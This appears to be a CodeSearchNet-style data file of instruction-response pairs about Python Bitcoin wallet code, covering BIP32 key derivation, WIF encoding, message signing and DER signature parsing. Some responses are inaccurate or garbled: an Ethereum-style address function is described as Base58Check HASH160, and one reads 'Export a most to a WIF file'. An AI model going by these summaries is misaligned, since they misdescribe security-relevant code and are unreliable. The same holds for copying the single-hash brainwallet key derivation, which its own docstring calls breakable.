{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef public_copy(self):\n        return self.__class__(\n            chain_code=self.chain_code,\n            depth=self.depth,\n            parent_fingerprint=self.parent_fingerprint,\n            child_number=self.child_number,\n            public_pair=self.public_key.to_public_pair(),\n            network=self.network)", "response": "Clone this wallet and strip it of its private information."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef serialize(self, private=True):\n        if private and not self.private_key:\n            raise ValueError(\"Cannot serialize a public key as private\")\n\n        if private:\n            network_version = long_to_hex(\n                self.network.EXT_SECRET_KEY, 8)\n        else:\n            network_version = long_to_hex(\n                self.network.EXT_PUBLIC_KEY, 8)\n        depth = long_to_hex(self.depth, 2)\n        parent_fingerprint = self.parent_fingerprint[2:]  # strip leading 0x\n        child_number = long_to_hex(self.child_number, 8)\n        chain_code = self.chain_code\n        ret = (network_version + depth + parent_fingerprint + child_number +\n               chain_code)\n        # Private and public serializations are slightly different\n        if private:\n            ret += b'00' + self.private_key.get_key()\n        else:\n            ret += self.get_public_key_hex(compressed=True)\n        return ensure_bytes(ret.lower())", "response": "Serialize this key into a string."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nencodes the serialized node in base58.", "response": "def serialize_b58(self, private=True):\n        \"\"\"Encode the serialized node in base58.\"\"\"\n        return ensure_str(\n            base58.b58encode_check(unhexlify(self.serialize(private))))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef to_address(self):\n        key = unhexlify(self.get_public_key_hex())\n        # First get the hash160 of the key\n        hash160_bytes = hash160(key)\n        # Prepend the network address byte\n        network_hash160_bytes = \\\n            chr_py2(self.network.PUBKEY_ADDRESS) + hash160_bytes\n        # Return a base58 encoded address with a checksum\n        return ensure_str(base58.b58encode_check(network_hash160_bytes))", "response": "Create a public address from this Wallet."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef deserialize(cls, key, network=\"bitcoin_testnet\"):\n        network = Wallet.get_network(network)\n\n        if len(key) in [78, (78 + 32)]:\n            # we have a byte array, so pass\n            pass\n        else:\n            key = ensure_bytes(key)\n            if len(key) in [78 * 2, (78 + 32) * 2]:\n                # we have a hexlified non-base58 key, continue!\n                key = unhexlify(key)\n            elif len(key) == 111:\n                # We have a base58 encoded string\n                key = base58.b58decode_check(key)\n        # Now that we double checkd the values, convert back to bytes because\n        # they're easier to slice\n        version, depth, parent_fingerprint, child, chain_code, key_data = (\n            key[:4], key[4], key[5:9], key[9:13], key[13:45], key[45:])\n\n        version_long = long_or_int(hexlify(version), 16)\n        exponent = None\n        pubkey = None\n        point_type = key_data[0]\n        if not isinstance(point_type, six.integer_types):\n            point_type = ord(point_type)\n        if point_type == 0:\n            # Private key\n            if version_long != network.EXT_SECRET_KEY:\n                raise incompatible_network_exception_factory(\n                    network.NAME, network.EXT_SECRET_KEY,\n                    version)\n            exponent = key_data[1:]\n        elif point_type in [2, 3, 4]:\n            # Compressed public coordinates\n            if version_long != network.EXT_PUBLIC_KEY:\n                raise incompatible_network_exception_factory(\n                    network.NAME, network.EXT_PUBLIC_KEY,\n                    version)\n            pubkey = PublicKey.from_hex_key(key_data, network=network)\n            # Even though this was generated from a compressed pubkey, we\n            # want to store it as an uncompressed pubkey\n            pubkey.compressed = False\n        else:\n            raise ValueError(\"Invalid key_data prefix, got %s\" % point_type)\n\n        def l(byte_seq):\n            if byte_seq is None:\n                return byte_seq\n            elif isinstance(byte_seq, six.integer_types):\n                return byte_seq\n            return long_or_int(hexlify(byte_seq), 16)\n\n        return cls(depth=l(depth),\n                   parent_fingerprint=l(parent_fingerprint),\n                   child_number=l(child),\n                   chain_code=l(chain_code),\n                   private_exponent=l(exponent),\n                   public_key=pubkey,\n                   network=network)", "response": "Load the ExtendedBip32Key from a hex key."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef from_master_secret(cls, seed, network=\"bitcoin_testnet\"):\n        network = Wallet.get_network(network)\n        seed = ensure_bytes(seed)\n        # Given a seed S of at least 128 bits, but 256 is advised\n        # Calculate I = HMAC-SHA512(key=\"Bitcoin seed\", msg=S)\n        I = hmac.new(b\"Bitcoin seed\", msg=seed, digestmod=sha512).digest()\n        # Split I into two 32-byte sequences, IL and IR.\n        I_L, I_R = I[:32], I[32:]\n        # Use IL as master secret key, and IR as master chain code.\n        return cls(private_exponent=long_or_int(hexlify(I_L), 16),\n                   chain_code=long_or_int(hexlify(I_R), 16),\n                   network=network)", "response": "Generate a new PrivateKey from a master secret key."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef from_master_secret_slow(cls, password, network=BitcoinMainNet):\n        # Make sure the password string is bytes\n        key = ensure_bytes(password)\n        data = unhexlify(b\"0\" * 64)  # 256-bit 0\n        for i in range(50000):\n            data = hmac.new(key, msg=data, digestmod=sha256).digest()\n        return cls.from_master_secret(data, network)", "response": "Generate a new key from a master secret using 50000 rounds of HMAC - SHA256."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef new_random_wallet(cls, user_entropy=None, network=BitcoinMainNet):\n        seed = str(urandom(64))  # 512/8\n        # weak extra protection inspired by pybitcointools implementation:\n        seed += str(int(time.time()*10**6))\n        if user_entropy:\n            user_entropy = str(user_entropy)  # allow for int/long\n            seed += user_entropy\n        return cls.from_master_secret(seed, network=network)", "response": "Generate a new wallet using a randomly generated 512 bit seed."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the byte representation of a hex - or byte - string.", "response": "def get_bytes(s):\n    \"\"\"Returns the byte representation of a hex- or byte-string.\"\"\"\n    if isinstance(s, bytes):\n        b = s\n    elif isinstance(s, str):\n        b = bytes.fromhex(s)\n    else:\n        raise TypeError(\"s must be either 'bytes' or 'str'!\")\n\n    return b"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ndecode a Base58Check encoded private - key.", "response": "def from_b58check(private_key):\n        \"\"\" Decodes a Base58Check encoded private-key.\n\n        Args:\n            private_key (str): A Base58Check encoded private key.\n\n        Returns:\n            PrivateKey: A PrivateKey object\n        \"\"\"\n        b58dec = base58.b58decode_check(private_key)\n        version = b58dec[0]\n        assert version in [PrivateKey.TESTNET_VERSION,\n                           PrivateKey.MAINNET_VERSION]\n\n        return PrivateKey(int.from_bytes(b58dec[1:], 'big'))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the public key associated with this private key.", "response": "def public_key(self):\n        \"\"\" Returns the public key associated with this private key.\n\n        Returns:\n            PublicKey:\n                The PublicKey object that corresponds to this\n                private key.\n        \"\"\"\n        if self._public_key is None:\n            self._public_key = PublicKey.from_point(\n                bitcoin_curve.public_key(self.key))\n        return self._public_key"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef raw_sign(self, message, do_hash=True):\n        if isinstance(message, str):\n            msg = bytes(message, 'ascii')\n        elif isinstance(message, bytes):\n            msg = message\n        else:\n            raise TypeError(\"message must be either str or bytes!\")\n\n        sig_pt, rec_id = bitcoin_curve.sign(msg, self.key, do_hash)\n\n        # Take care of large s:\n        # Bitcoin deals with large s, by subtracting\n        # s from the curve order. See:\n        # https://bitcointalk.org/index.php?topic=285142.30;wap2\n        if sig_pt.y >= (bitcoin_curve.n // 2):\n            sig_pt = Point(sig_pt.x, bitcoin_curve.n - sig_pt.y)\n            rec_id ^= 0x1\n\n        return (sig_pt, rec_id)", "response": "Signs a message using this private key."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef sign(self, message, do_hash=True):\n        # Some BTC things want to have the recovery id to extract the public\n        # key, so we should figure that out.\n        sig_pt, rec_id = self.raw_sign(message, do_hash)\n\n        return Signature(sig_pt.x, sig_pt.y, rec_id)", "response": "Signs a message using this private key."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nsign a message using this private key.", "response": "def sign_bitcoin(self, message, compressed=False):\n        \"\"\" Signs a message using this private key such that it\n        is compatible with bitcoind, bx, and other Bitcoin\n        clients/nodes/utilities.\n\n        Note:\n            0x18 + b\\\"Bitcoin Signed Message:\" + newline + len(message) is\n            prepended to the message before signing.\n\n        Args:\n            message (bytes or str): Message to be signed.\n            compressed (bool): True if the corresponding public key will be\n              used in compressed format. False if the uncompressed version\n              is used.\n\n        Returns:\n            bytes: A Base64-encoded byte string of the signed message.\n            The first byte of the encoded message contains information\n            about how to recover the public key. In bitcoind parlance,\n            this is the magic number containing the recovery ID and\n            whether or not the key was compressed or not.\n        \"\"\"\n        if isinstance(message, str):\n            msg_in = bytes(message, 'ascii')\n        elif isinstance(message, bytes):\n            msg_in = message\n        else:\n            raise TypeError(\"message must be either str or bytes!\")\n\n        msg = b\"\\x18Bitcoin Signed Message:\\n\" + bytes([len(msg_in)]) + msg_in\n        msg_hash = hashlib.sha256(msg).digest()\n\n        sig = self.sign(msg_hash)\n        comp_adder = 4 if compressed else 0\n        magic = 27 + sig.recovery_id + comp_adder\n\n        return base64.b64encode(bytes([magic]) + bytes(sig))"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates a Base58Check encoding of this private key.", "response": "def to_b58check(self, testnet=False):\n        \"\"\" Generates a Base58Check encoding of this private key.\n\n        Returns:\n            str: A Base58Check encoded string representing the key.\n        \"\"\"\n        version = self.TESTNET_VERSION if testnet else self.MAINNET_VERSION\n        return base58.b58encode_check(bytes([version]) + bytes(self))"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate a public key object from an integer.", "response": "def from_int(i):\n        \"\"\" Generates a public key object from an integer.\n\n        Note:\n            This assumes that the upper 32 bytes of the integer\n            are the x component of the public key point and the\n            lower 32 bytes are the y component.\n\n        Args:\n            i (Bignum): A 512-bit integer representing the public\n               key point on the secp256k1 curve.\n\n        Returns:\n            PublicKey: A PublicKey object.\n        \"\"\"\n        point = ECPointAffine.from_int(bitcoin_curve, i)\n        return PublicKey.from_point(point)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef from_bytes(key_bytes):\n        b = get_bytes(key_bytes)\n        key_bytes_len = len(b)\n\n        key_type = b[0]\n        if key_type == 0x04:\n            # Uncompressed\n            if key_bytes_len != 65:\n                raise ValueError(\"key_bytes must be exactly 65 bytes long when uncompressed.\")\n\n            x = int.from_bytes(b[1:33], 'big')\n            y = int.from_bytes(b[33:65], 'big')\n        elif key_type == 0x02 or key_type == 0x03:\n            if key_bytes_len != 33:\n                raise ValueError(\"key_bytes must be exactly 33 bytes long when compressed.\")\n\n            x = int.from_bytes(b[1:33], 'big')\n            ys = bitcoin_curve.y_from_x(x)\n\n            # Pick the one that corresponds to key_type\n            last_bit = key_type - 0x2\n            for y in ys:\n                if y & 0x1 == last_bit:\n                    break\n        else:\n            return None\n\n        return PublicKey(x, y)", "response": "Generates a public key object from a byte stream."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef from_signature(message, signature):\n        if signature.recovery_id is None:\n            raise ValueError(\"The signature must have a recovery_id.\")\n\n        msg = get_bytes(message)\n        pub_keys = bitcoin_curve.recover_public_key(msg,\n                                                    signature,\n                                                    signature.recovery_id)\n\n        for k, recid in pub_keys:\n            if signature.recovery_id is not None and recid == signature.recovery_id:\n                return PublicKey(k.x, k.y)\n\n        return None", "response": "Given a message and a signature returns a PublicKey object."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef verify_bitcoin(message, signature, address):\n        magic_sig = base64.b64decode(signature)\n\n        magic = magic_sig[0]\n        sig = Signature.from_bytes(magic_sig[1:])\n        sig.recovery_id = (magic - 27) & 0x3\n        compressed = ((magic - 27) & 0x4) != 0\n\n        # Build the message that was signed\n        msg = b\"\\x18Bitcoin Signed Message:\\n\" + bytes([len(message)]) + message\n        msg_hash = hashlib.sha256(msg).digest()\n\n        derived_public_key = PublicKey.from_signature(msg_hash, sig)\n        if derived_public_key is None:\n            raise ValueError(\"Could not recover public key from the provided signature.\")\n\n        ver, h160 = address_to_key_hash(address)\n        hash160 = derived_public_key.hash160(compressed)\n        if hash160 != h160:\n            return False\n\n        return derived_public_key.verify(msg_hash, sig)", "response": "Verifies a message signed using a Bitcoin private key."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef address(self, compressed=True, testnet=False):\n        version = '0x'\n        return version + binascii.hexlify(self.keccak[12:]).decode('ascii')", "response": "Return the Base58Check encoded version of the HASH160 key."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef verify(self, message, signature, do_hash=True):\n        msg = get_bytes(message)\n        return bitcoin_curve.verify(msg, signature, self.point, do_hash)", "response": "Verifies that the message was appropriately signed by the current curve."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndecodes a ASN. 1 signature from DER - encoded bytes or string.", "response": "def from_der(der):\n        \"\"\" Decodes a Signature that was DER-encoded.\n\n        Args:\n            der (bytes or str): The DER encoding to be decoded.\n\n        Returns:\n            Signature: The deserialized signature.\n        \"\"\"\n        d = get_bytes(der)\n        # d must conform to (from btcd):\n        # [0 ] 0x30      - ASN.1 identifier for sequence\n        # [1 ] <1-byte>  - total remaining length\n        # [2 ] 0x02      - ASN.1 identifier to specify an integer follows\n        # [3 ] <1-byte>  - length of R\n        # [4.] <bytes>   - R\n        # [..] 0x02      - ASN.1 identifier to specify an integer follows\n        # [..] <1-byte>  - length of S\n        # [..] <bytes>   - S\n\n        # 6 bytes + R (min. 1 byte) + S (min. 1 byte)\n        if len(d) < 8:\n            raise ValueError(\"DER signature string is too short.\")\n        # 6 bytes + R (max. 33 bytes) + S (max. 33 bytes)\n        if len(d) > 72:\n            raise ValueError(\"DER signature string is too long.\")\n        if d[0] != 0x30:\n            raise ValueError(\"DER signature does not start with 0x30.\")\n        if d[1] != len(d[2:]):\n            raise ValueError(\"DER signature length incorrect.\")\n\n        total_length = d[1]\n\n        if d[2] != 0x02:\n            raise ValueError(\"DER signature no 1st int marker.\")\n        if d[3] <= 0 or d[3] > (total_length - 7):\n            raise ValueError(\"DER signature incorrect R length.\")\n\n        # Grab R, check for errors\n        rlen = d[3]\n        s_magic_index = 4 + rlen\n        rb = d[4:s_magic_index]\n\n        if rb[0] & 0x80 != 0:\n            raise ValueError(\"DER signature R is negative.\")\n        if len(rb) > 1 and rb[0] == 0 and rb[1] & 0x80 != 0x80:\n            raise ValueError(\"DER signature R is excessively padded.\")\n\n        r = int.from_bytes(rb, 'big')\n\n        # Grab S, check for errors\n        if d[s_magic_index] != 0x02:\n            raise ValueError(\"DER signature no 2nd int marker.\")\n        slen_index = s_magic_index + 1\n        slen = d[slen_index]\n        if slen <= 0 or slen > len(d) - (slen_index + 1):\n            raise ValueError(\"DER signature incorrect S length.\")\n\n        sb = d[slen_index + 1:]\n\n        if sb[0] & 0x80 != 0:\n            raise ValueError(\"DER signature S is negative.\")\n        if len(sb) > 1 and sb[0] == 0 and sb[1] & 0x80 != 0x80:\n            raise ValueError(\"DER signature S is excessively padded.\")\n\n        s = int.from_bytes(sb, 'big')\n\n        if r < 1 or r >= bitcoin_curve.n:\n            raise ValueError(\"DER signature R is not between 1 and N - 1.\")\n        if s < 1 or s >= bitcoin_curve.n:\n            raise ValueError(\"DER signature S is not between 1 and N - 1.\")\n\n        return Signature(r, s)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nextract the r and s components from a 64 - byte long string.", "response": "def from_bytes(b):\n        \"\"\" Extracts the r and s components from a byte string.\n\n        Args:\n            b (bytes): A 64-byte long string. The first 32 bytes are\n               extracted as the r component and the second 32 bytes\n               are extracted as the s component.\n\n        Returns:\n            Signature: A Signature object.\n\n        Raises:\n            ValueError: If signature is incorrect length\n        \"\"\"\n        if len(b) != 64:\n            raise ValueError(\"from_bytes: Signature length != 64.\")\n        r = int.from_bytes(b[0:32], 'big')\n        s = int.from_bytes(b[32:64], 'big')\n        return Signature(r, s)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nencodes this signature using DEREncode", "response": "def to_der(self):\n        \"\"\" Encodes this signature using DER\n\n        Returns:\n            bytes: The DER encoding of (self.r, self.s).\n        \"\"\"\n        # Output should be:\n        # 0x30 <length> 0x02 <length r> r 0x02 <length s> s\n        r, s = self._canonicalize()\n\n        total_length = 6 + len(r) + len(s)\n        der = bytes([0x30, total_length - 2, 0x02, len(r)]) + r + bytes([0x02, len(s)]) + s\n        return der"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate either a HDPrivateKey or HDPublicKey object from the underlying bytes.", "response": "def from_bytes(b):\n        \"\"\" Generates either a HDPrivateKey or HDPublicKey from the underlying\n        bytes.\n\n        The serialization must conform to the description in:\n        https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki#serialization-format\n\n        Args:\n            b (bytes): A byte stream conforming to the above.\n\n        Returns:\n            HDPrivateKey or HDPublicKey:\n                Either an HD private or\n                public key object, depending on what was serialized.\n        \"\"\"\n        if len(b) < 78:\n            raise ValueError(\"b must be at least 78 bytes long.\")\n\n        version = int.from_bytes(b[:4], 'big')\n        depth = b[4]\n        parent_fingerprint = b[5:9]\n        index = int.from_bytes(b[9:13], 'big')\n        chain_code = b[13:45]\n        key_bytes = b[45:78]\n\n        rv = None\n        if version == HDPrivateKey.MAINNET_VERSION or version == HDPrivateKey.TESTNET_VERSION:\n            if key_bytes[0] != 0:\n                raise ValueError(\"First byte of private key must be 0x00!\")\n\n            private_key = int.from_bytes(key_bytes[1:], 'big')\n            rv = HDPrivateKey(key=private_key,\n                              chain_code=chain_code,\n                              index=index,\n                              depth=depth,\n                              parent_fingerprint=parent_fingerprint)\n        elif version == HDPublicKey.MAINNET_VERSION or version == HDPublicKey.TESTNET_VERSION:\n            if key_bytes[0] != 0x02 and key_bytes[0] != 0x03:\n                raise ValueError(\"First byte of public key must be 0x02 or 0x03!\")\n\n            public_key = PublicKey.from_bytes(key_bytes)\n            rv = HDPublicKey(x=public_key.point.x,\n                             y=public_key.point.y,\n                             chain_code=chain_code,\n                             index=index,\n                             depth=depth,\n                             parent_fingerprint=parent_fingerprint)\n        else:\n            raise ValueError(\"incorrect encoding.\")\n\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating a Base58Check encoding of the current key.", "response": "def to_b58check(self, testnet=False):\n        \"\"\" Generates a Base58Check encoding of this key.\n\n        Args:\n            testnet (bool): True if the key is to be used with\n                testnet, False otherwise.\n        Returns:\n            str: A Base58Check encoded string representing the key.\n        \"\"\"\n        b = self.testnet_bytes if testnet else bytes(self)\n        return base58.b58encode_check(b)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef master_key_from_entropy(passphrase='', strength=128):\n        if strength % 32 != 0:\n            raise ValueError(\"strength must be a multiple of 32\")\n        if strength < 128 or strength > 256:\n            raise ValueError(\"strength should be >= 128 and <= 256\")\n        entropy = rand_bytes(strength // 8)\n        m = Mnemonic(language='english')\n        n = m.to_mnemonic(entropy)\n        return HDPrivateKey.master_key_from_seed(\n            Mnemonic.to_seed(n, passphrase)), n", "response": "Generates a master key from system entropy."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef master_key_from_seed(seed):\n        S = get_bytes(seed)\n        I = hmac.new(b\"Bitcoin seed\", S, hashlib.sha512).digest()\n        Il, Ir = I[:32], I[32:]\n        parse_Il = int.from_bytes(Il, 'big')\n        if parse_Il == 0 or parse_Il >= bitcoin_curve.n:\n            raise ValueError(\"Bad seed, resulting in invalid key!\")\n\n        return HDPrivateKey(key=parse_Il, chain_code=Ir, index=0, depth=0)", "response": "Generates a master key from a provided seed."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nderives a child private key from a parent private key.", "response": "def from_parent(parent_key, i):\n        \"\"\" Derives a child private key from a parent\n        private key. It is not possible to derive a child\n        private key from a public parent key.\n\n        Args:\n            parent_private_key (HDPrivateKey):\n        \"\"\"\n        if not isinstance(parent_key, HDPrivateKey):\n            raise TypeError(\"parent_key must be an HDPrivateKey object.\")\n\n        hmac_key = parent_key.chain_code\n        if i & 0x80000000:\n            hmac_data = b'\\x00' + bytes(parent_key._key) + i.to_bytes(length=4, byteorder='big')\n        else:\n            hmac_data = parent_key.public_key.compressed_bytes + i.to_bytes(length=4, byteorder='big')\n\n        I = hmac.new(hmac_key, hmac_data, hashlib.sha512).digest()\n        Il, Ir = I[:32], I[32:]\n\n        parse_Il = int.from_bytes(Il, 'big')\n        if parse_Il >= bitcoin_curve.n:\n            return None\n\n        child_key = (parse_Il + parent_key._key.key) % bitcoin_curve.n\n\n        if child_key == 0:\n            # Incredibly unlucky choice\n            return None\n\n        child_depth = parent_key.depth + 1\n        return HDPrivateKey(key=child_key,\n                            chain_code=Ir,\n                            index=i,\n                            depth=child_depth,\n                            parent_fingerprint=parent_key.fingerprint)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef public_key(self):\n        if self._public_key is None:\n            self._public_key = HDPublicKey(x=self._key.public_key.point.x,\n                                           y=self._key.public_key.point.y,\n                                           chain_code=self.chain_code,\n                                           index=self.index,\n                                           depth=self.depth,\n                                           parent_fingerprint=self.parent_fingerprint)\n\n        return self._public_key", "response": "Returns the public key associated with this private key."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsign a message using the underlying non - extended private key.", "response": "def raw_sign(self, message, do_hash=True):\n        \"\"\" Signs message using the underlying non-extended private key.\n\n        Args:\n            message (bytes): The message to be signed. If a string is\n                provided it is assumed the encoding is 'ascii' and\n                converted to bytes. If this is not the case, it is up\n                to the caller to convert the string to bytes\n                appropriately and pass in the bytes.\n            do_hash (bool): True if the message should be hashed prior\n                to signing, False if not. This should always be left as\n                True except in special situations which require doing\n                the hash outside (e.g. handling Bitcoin bugs).\n\n        Returns:\n            ECPointAffine:\n                a raw point (r = pt.x, s = pt.y) which is\n                the signature.\n        \"\"\"\n        return self._key.raw_sign(message, do_hash)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef sign(self, message, do_hash=True):\n        return self._key.sign(message, do_hash)", "response": "Signs a message using the underlying non - extended private key."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef sign_bitcoin(self, message, compressed=False):\n\n        return self._key.sign_bitcoin(message, compressed)", "response": "Signs a message using the underlying private key such that it is compatible with bitcoind bx and other private - keys."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the Base58Check encoded version of the HASH160 key.", "response": "def address(self, compressed=True, testnet=False):\n        \"\"\" Address property that returns the Base58Check\n        encoded version of the HASH160.\n\n        Args:\n            compressed (bool): Whether or not the compressed key should\n               be used.\n            testnet (bool): Whether or not the key is intended for testnet\n               usage. False indicates mainnet usage.\n\n        Returns:\n            bytes: Base58Check encoded string\n        \"\"\"\n        return self._key.address(True, testnet)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nverify that the message was appropriately signed by the key.", "response": "def verify(self, message, signature, do_hash=True):\n        \"\"\" Verifies that message was appropriately signed.\n\n        Args:\n            message (bytes): The message to be verified.\n            signature (Signature): A signature object.\n            do_hash (bool): True if the message should be hashed prior\n                to signing, False if not. This should always be left as\n                True except in special situations which require doing\n                the hash outside (e.g. handling Bitcoin bugs).\n\n        Returns:\n            verified (bool): True if the signature is verified, False\n            otherwise.\n        \"\"\"\n        return self._key.verify(message, signature, do_hash)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning ripemd160 hash of data", "response": "def hash160(data):\n    \"\"\"Return ripemd160(sha256(data))\"\"\"\n    rh = hashlib.new('ripemd160', sha256(data).digest())\n    return rh.digest()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nchecking if the string is only composed of hex characters.", "response": "def is_hex_string(string):\n    \"\"\"Check if the string is only composed of hex characters.\"\"\"\n    pattern = re.compile(r'[A-Fa-f0-9]+')\n    if isinstance(string, six.binary_type):\n        string = str(string)\n    return pattern.match(string) is not None"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef long_to_hex(l, size):\n    f_str = \"{0:0%sx}\" % size\n    return ensure_bytes(f_str.format(l).lower())", "response": "Encode a long value as a hex string 0 - padding to size."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the PublicKey for this PrivateKey.", "response": "def get_public_key(self):\n        \"\"\"Get the PublicKey for this PrivateKey.\"\"\"\n        return PublicKey.from_verifying_key(\n            self._private_key.get_verifying_key(),\n            network=self.network, compressed=self.compressed)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_extended_key(self):\n        network_hex_chars = hexlify(\n            chr_py2(self.network.SECRET_KEY))\n        return ensure_bytes(network_hex_chars + self.get_key())", "response": "Get the extended key."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef export_to_wif(self, compressed=None):\n        # Add the network byte, creating the \"extended key\"\n        extended_key_hex = self.get_extended_key()\n        extended_key_bytes = unhexlify(extended_key_hex)\n        if compressed is None:\n            compressed = self.compressed\n        if compressed:\n            extended_key_bytes += '\\01'\n        # And return the base58-encoded result with a checksum\n        return ensure_str(base58.b58encode_check(extended_key_bytes))", "response": "Export a most\n            to a WIF file."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef from_wif(cls, wif, network=BitcoinMainNet):\n        # Decode the base58 string and ensure the checksum is valid\n        wif = ensure_str(wif)\n        try:\n            extended_key_bytes = base58.b58decode_check(wif)\n        except ValueError as e:\n            # Invalid checksum!\n            raise ChecksumException(e)\n\n        # Verify we're on the right network\n        network_bytes = extended_key_bytes[0]\n        # py3k interprets network_byte as an int already\n        if not isinstance(network_bytes, six.integer_types):\n            network_bytes = ord(network_bytes)\n        if (network_bytes != network.SECRET_KEY):\n            raise incompatible_network_exception_factory(\n                network_name=network.NAME,\n                expected_prefix=network.SECRET_KEY,\n                given_prefix=network_bytes)\n\n        # Drop the network bytes\n        extended_key_bytes = extended_key_bytes[1:]\n\n        # Check for comprssed public key\n        # This only affects the way in which addresses are generated.\n        compressed = False\n        if len(extended_key_bytes) == 33:\n            # We are supposed to use compressed form!\n            extended_key_bytes = extended_key_bytes[:-1]\n            compressed = True\n\n        # And we should finally have a valid key\n        return cls(long_or_int(hexlify(extended_key_bytes), 16), network,\n                   compressed=compressed)", "response": "Create a new key from a WIF string."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ngenerate a new key from a master password.", "response": "def from_master_password(cls, password, network=BitcoinMainNet):\n        \"\"\"Generate a new key from a master password.\n\n        This password is hashed via a single round of sha256 and is highly\n        breakable, but it's the standard brainwallet approach.\n\n        See `PrivateKey.from_master_password_slow` for a slightly more\n        secure generation method (which will still be subject to a rainbow\n        table attack :\\)\n        \"\"\"\n        password = ensure_bytes(password)\n        key = sha256(password).hexdigest()\n        return cls.from_hex_key(key, network)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_key(self, compressed=None):\n        if compressed is None:\n            compressed = self.compressed\n        if compressed:\n            parity = 2 + (self.y & 1)  # 0x02 even, 0x03 odd\n            return ensure_bytes(\n                long_to_hex(parity, 2) +\n                long_to_hex(self.x, 64))\n        else:\n            return ensure_bytes(\n                b'04' +\n                long_to_hex(self.x, 64) +\n                long_to_hex(self.y, 64))", "response": "Get the hex - encoded key."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef from_hex_key(cls, key, network=BitcoinMainNet):\n        if len(key) == 130 or len(key) == 66:\n            # It might be a hexlified byte array\n            try:\n                key = unhexlify(key)\n            except TypeError:\n                pass\n        key = ensure_bytes(key)\n\n        compressed = False\n        id_byte = key[0]\n        if not isinstance(id_byte, six.integer_types):\n            id_byte = ord(id_byte)\n        if id_byte == 4:\n            # Uncompressed public point\n            # 1B ID + 32B x coord + 32B y coord = 65 B\n            if len(key) != 65:\n                raise KeyParseError(\"Invalid key length\")\n            public_pair = PublicPair(\n                long_or_int(hexlify(key[1:33]), 16),\n                long_or_int(hexlify(key[33:]), 16))\n        elif id_byte in [2, 3]:\n            # Compressed public point!\n            compressed = True\n            if len(key) != 33:\n                raise KeyParseError(\"Invalid key length\")\n            y_odd = bool(id_byte & 0x01)  # 0 even, 1 odd\n            x = long_or_int(hexlify(key[1:]), 16)\n            # The following x-to-pair algorithm was lifted from pycoin\n            # I still need to sit down an understand it. It is also described\n            # in http://www.secg.org/collateral/sec1_final.pdf\n            curve = SECP256k1.curve\n            p = curve.p()\n            # For SECP256k1, curve.a() is 0 and curve.b() is 7, so this is\n            # effectively (x ** 3 + 7) % p, but the full equation is kept\n            # for just-in-case-the-curve-is-broken future-proofing\n            alpha = (pow(x, 3, p) + curve.a() * x + curve.b()) % p\n            beta = square_root_mod_prime(alpha, p)\n            y_even = not y_odd\n            if y_even == bool(beta & 1):\n                public_pair = PublicPair(x, p - beta)\n            else:\n                public_pair = PublicPair(x, beta)\n        else:\n            raise KeyParseError(\"The given key is not in a known format.\")\n        return cls.from_public_pair(public_pair, network=network,\n                                    compressed=compressed)", "response": "Load the PublicKey from a compressed or uncompressed hex key."}
